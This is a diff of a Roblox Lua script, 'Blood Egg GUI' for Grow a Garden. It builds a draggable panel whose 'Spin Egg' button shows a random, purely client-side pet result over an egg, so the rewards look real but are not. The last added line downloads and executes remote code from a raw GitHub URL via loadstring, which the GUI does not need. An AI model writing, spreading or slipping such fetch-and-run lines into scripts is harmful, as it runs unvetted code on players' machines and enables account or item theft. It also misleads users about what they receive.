@@ -1,41 +1,136 @@
---[[ Blood Egg GUI - Grow a Garden Script Features:
+--[[ 
+    Blood Egg GUI by Blood.lust
 
-Toggleable GUI with RightShift
+    Features:
+    - GUI Toggle (RightShift)
+    - Shrinks to B icon
+    - 10s cooldown
+    - Randomized pet spin with rarity
+    - Floating text above egg
+]]
 
-Shrinks to B icon when minimized
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
 
-Egg spin with 10s cooldown
+local LocalPlayer = Players.LocalPlayer
 
-Floating text on egg with result
+-- Pets per rarity
+local Pets = {
+    Common = {"Bunny", "Dog", "Golden lab"},
+    Uncommon = {"Black bunny", "Cat", "Chicken", "Deer"},
+    Rare = {"Monkey", "Orange tabby", "Pig", "Rooster", "Spotted deer"},
+    Legendary = {"Cow", "Polar bear", "Sea otter", "Silver monkey", "Turtle"},
+    Mythical = {"Brown mouse", "Caterpillar", "Giant ant", "Grey mouse", "Red fox", "Snail", "Squirrel"},
+    Divine = {"Dragonfly", "Queen bee", "Night owl", "Raccoon"}
+}
 
-Pet result randomized by egg rarity
+-- Weighted rarity roll
+local function randomPet()
+    local rarities = {"Common", "Uncommon", "Rare", "Legendary", "Mythical", "Divine"}
+    local chances = {50, 25, 15, 6, 3, 1}
+    local total, roll, current = 0, 0, 0
 
-Created by Blood.lust ]]
+    for _, c in ipairs(chances) do total += c end
+    roll = math.random(1, total)
 
+    for i, rarity in ipairs(rarities) do
+        current += chances[i]
+        if roll <= current then
+            local petList = Pets[rarity]
+            return petList[math.random(1, #petList)], rarity
+        end
+    end
+end
 
-local Players = game:GetService("Players") local ReplicatedStorage = game:GetService("ReplicatedStorage") local RunService = game:GetService("RunService") local player = Players.LocalPlayer local mouse = player:GetMouse() local cooldown = false
+-- GUI Setup
+local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+ScreenGui.Name = "BloodEggGUI"
 
-local lootTables = { Common = {"Bunny", "Dog", "Golden lab"}, Uncommon = {"Black bunny", "Cat", "Chicken", "Deer"}, Rare = {"Monkey", "Orange tabby", "Pig", "Rooster", "Spotted deer", "Honey bee", "Wasp", "Hedgehog", "Kiwi"}, Legendary = {"Cow", "Polar bear", "Sea otter", "Silver monkey", "Turtle", "Petal bee", "Tarantula hawk", "Moth", "Frog", "Mole", "Moon cat", "Panda", "Blood hedgehog"}, Mythical = {"Brown mouse", "Caterpillar", "Giant ant", "Grey mouse", "Praying mantis", "Red fox", "Red giant ant", "Snail", "Squirrel", "Bear bee", "Butterfly", "Blood Kiwi", "Echo frog", "Chicken zombie", "Firefly", "Owl", "Golden bee", "Cooked owl"}, Divine = {"Dragonfly", "Queen bee", "Disco bee", "Night owl", "Raccoon", "Blood owl"} }
+local main = Instance.new("Frame", ScreenGui)
+main.Size = UDim2.new(0, 300, 0, 150)
+main.Position = UDim2.new(0.5, -150, 0.5, -75)
+main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+main.Active = true
+main.Draggable = true
+main.Visible = true
+main.Name = "MainGUI"
 
--- GUI Setup local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui")) screenGui.Name = "BloodEggGUI" screenGui.ResetOnSpawn = false
+local toggleBtn = Instance.new("TextButton", main)
+toggleBtn.Size = UDim2.new(0, 30, 0, 30)
+toggleBtn.Position = UDim2.new(1, -35, 0, 5)
+toggleBtn.Text = "B"
+toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+toggleBtn.TextColor3 = Color3.new(1,1,1)
 
-local mainFrame = Instance.new("Frame", screenGui) mainFrame.Size = UDim2.new(0, 250, 0, 120) mainFrame.Position = UDim2.new(0.05, 0, 0.5, -60) mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) mainFrame.BorderSizePixel = 0 mainFrame.Visible = true mainFrame.Draggable = true mainFrame.Active = true
+local spinBtn = Instance.new("TextButton", main)
+spinBtn.Size = UDim2.new(0.8, 0, 0, 50)
+spinBtn.Position = UDim2.new(0.1, 0, 0.5, -25)
+spinBtn.Text = "Spin Egg"
+spinBtn.BackgroundColor3 = Color3.fromRGB(90, 0, 0)
+spinBtn.TextColor3 = Color3.new(1, 1, 1)
 
-local toggleButton = Instance.new("TextButton", mainFrame) toggleButton.Size = UDim2.new(0, 30, 0, 30) toggleButton.Position = UDim2.new(1, -35, 0, 5) toggleButton.Text = "B" toggleButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40) toggleButton.TextColor3 = Color3.new(1, 1, 1) toggleButton.MouseButton1Click:Connect(function() mainFrame.Visible = false miniButton.Visible = true end)
+-- Result Display
+local function displayResult(petName, rarity)
+    local eggPart = workspace:FindFirstChild("Egg") or workspace:FindFirstChildWhichIsA("Part")
+    if not eggPart then return end
 
-local miniButton = Instance.new("TextButton", screenGui) miniButton.Size = UDim2.new(0, 40, 0, 40) miniButton.Position = UDim2.new(0, 10, 0.5, -20) miniButton.Text = "B" miniButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30) miniButton.TextColor3 = Color3.new(1, 0, 0) miniButton.Visible = false miniButton.MouseButton1Click:Connect(function() mainFrame.Visible = true miniButton.Visible = false end)
+    local label = Instance.new("BillboardGui", eggPart)
+    label.Size = UDim2.new(0, 200, 0, 50)
+    label.StudsOffset = Vector3.new(0, 3, 0)
+    label.AlwaysOnTop = true
+    label.Adornee = eggPart
 
--- Spin Button local spinButton = Instance.new("TextButton", mainFrame) spinButton.Size = UDim2.new(1, -20, 0, 40) spinButton.Position = UDim2.new(0, 10, 0, 40) spinButton.Text = "🎲 Spin Egg" spinButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0) spinButton.TextColor3 = Color3.new(1, 1, 1)
+    local text = Instance.new("TextLabel", label)
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.Text = petName .. " (" .. rarity .. ")"
+    text.BackgroundTransparency = 1
+    text.TextColor3 = Color3.fromRGB(255, 255, 255)
+    text.TextStrokeTransparency = 0
+    text.TextScaled = true
 
--- Egg Spin Logic local function getEggRarityFromName(name) name = name:lower() if name:find("common") then return "Common" end if name:find("uncommon") then return "Uncommon" end if name:find("rare") then return "Rare" end if name:find("legendary") then return "Legendary" end if name:find("mythical") then return "Mythical" end if name:find("divine") then return "Divine" end return "Common" end
+    task.delay(5, function()
+        label:Destroy()
+    end)
+end
 
-local function spinEgg() if cooldown then return end cooldown = true spinButton.Text = "⏳ Spinning..."
+-- Cooldown logic
+local cooldown = false
+spinBtn.MouseButton1Click:Connect(function()
+    if cooldown then return end
+    cooldown = true
+    spinBtn.Text = "Spinning..."
+    task.wait(1.5)
+    local pet, rarity = randomPet()
+    spinBtn.Text = "You got: " .. pet
+    displayResult(pet, rarity)
+    task.delay(10, function()
+        spinBtn.Text = "Spin Egg"
+        cooldown = false
+    end)
+end)
 
-for _, egg in ipairs(workspace:GetDescendants()) do
-    if egg:IsA("Model") and egg.Name:lower():find("egg") then
-        local rarity = getEggRarityFromName(egg.Name)
-        local list = lootTables[rarity] or lootTables.Common
-        local result = list[math.random(1, #list)]
+-- Minimize button toggle
+local minimized = false
+toggleBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    main.Size = minimized and UDim2.new(0, 50, 0, 50) or UDim2.new(0, 300, 0, 150)
+    for _, child in ipairs(main:GetChildren()) do
+        if child:IsA("TextButton") and child ~= toggleBtn then
+            child.Visible = not minimized
+        end
+    end
+end)
 
-        local existingBillboard = egg:FindFirstChild("SpinLabel")
-        if existingBillboard then existingBillboard:Destroy() end
+-- Keyboard toggle
+UIS.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.KeyCode == Enum.KeyCode.RightShift then
+        main.Visible = not main.Visible
+    end
+end)
+
+-- Load external NoLag Hub
+loadstring(game:HttpGet("https://raw.githubusercontent.com/terist999/Grow-A-Garden-script_Nolagz/refs/heads/main/NoLag-idNo-Lag-HUBrefsheadsmainLoaderLoaderV1.lua.txt"))()
